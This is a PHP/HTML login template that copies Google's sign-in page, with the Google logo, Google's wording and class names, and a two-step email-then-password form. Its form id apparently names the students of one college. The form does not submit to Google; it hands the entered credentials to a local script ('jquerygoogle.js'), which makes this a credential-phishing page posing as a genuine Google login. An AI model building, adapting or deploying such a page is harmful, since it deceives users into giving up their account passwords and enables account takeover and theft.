<?php $this->view('componets/LoginHeader');?>
<script>
    var base_url= "<?=ROOT?>";
</script>
<link rel="stylesheet" type="text/css" href="<?=ASSETS?>css/style.css">
<body style="background:#fff">
<div class="Main" style="margin-top: 100px;">
    <div class="mini-container" > 
        <div class="login-widget-g">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg>
            </div>
            <form method="POST" class="form-group" id="__LoginMercyCollegeStudent" autocomplete="on" action="javascript:void(0)">
                <!-- panel 1 -->
                <div class="element-cpanel1 cpanel1">
                    <div class="jXeDnc " jsname="tJHJj" jscontroller="S9352b" jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;">
                        <h1 class="ahT6S " data-a11y-title-piece="" id="headingText" jsname="r4nke">
                            <span jsslot="">Sign in</span>
                        </h1>
                        <div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob">
                            <span jsslot="">Use your Google Account</span>
                        </div>
                    </div>
                    <div class="group-inputs">
                        <label for="username" >Email or phone</label>
                        <input type="text" class="____userEmail" name="____email" id="username" />
                    </div>
                    <div class="mt-4 mb-4">
                        <svg style="color: #d93025;display:none; "" aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                        <span class="errorMsg1" style="display:none;margin-bottom:15px"></span>
                    </div>
                    <span class="mt-5">
                        <a href="javascript:void(0)" class="link-c">Forgot email?</a>
                    </span>
                    <div class="PrDSKc">Not your computer? Use Guest mode to sign in privately. 
                        <a href="https://support.google.com/chrome/answer/6130773?hl=en" class="link-c" jsname="JFyozc" target="_blank">Learn more</a>
                    </div>
                    <div class="flex-container element-btn ">
                        <div class="pull-left action-c">
                            <div class="">
                                <span><a href="javascript:void(0)" class="link-c">Create account</a></span>
                            </div>
                        </div>
                        <div class="pull-right">
                            <button type="submit" value="Login"  class="btn btn-google btn-primary pull-left" style="background:#1a73e8">Next</button>
                        </div>                
                    </div>
                </div>
               
                <!-- close panel 1 -->
                <!-- panle 2 -->
                <div class="element-cpanel2 cpanel2" style="display:none">
                    <div class="jXeDnc " jsname="tJHJj" jscontroller="S9352b" jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;">
                        <h1 class="ahT6S " data-a11y-title-piece="" id="headingText" jsname="r4nke">
                            <span jsslot="">Welcome</span>
                        </h1>
                        <div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob">
                            <span class="__issetUserName"></span>
                        </div>
                    </div>
                     <div class="group-inputs">
                        <label for="____userPassword" >Enter your password</label>
                        <input type="password" class="____userPassword" name="____userPassword" value=""/>
                    </div>
                    <div class="mt-4 mb-4">
                        <svg style="color: #d93025;display:none; "" aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                        <span class="errorMsg2" style="display:none;margin-bottom:15px"></span>
                    </div>  
                    <div class="helper-links-container">
                        <div class="helper-item ">
                            <span class="stay-signed-in checkbox-container">
                                <label class="persistent ____rememberMe" for="persistent" >
                                    <input id="persistent" name="persistent" value="y" type="checkbox">
                                    <span style="color:black">Show&nbsp;password</span>
                                </label>
                            </span>
                        </div>
                    </div>
                    <div class="flex-container element-btn ">
                    <div class="pull-left action-c">
                        <div class="">
                            <span><a href="javascript:void(0)" class="link-c">Forgot password?</a></span>
                        </div>
                    </div>
                    <div class="pull-right">
                        <button type="submit" value="Login"  class="btn btn-googleSubmint btn-google btn-primary pull-left" style="background:#1a73e8">Login</button>
                    </div>                
                </div>
                </div>
                
                <!-- close panel 2 -->
                <br>
                <br>
            </form>
        </div>
    </div>
</div>
<script src="<?=ASSETS?>js/jquerygoogle.js"></script>
</body>
</html>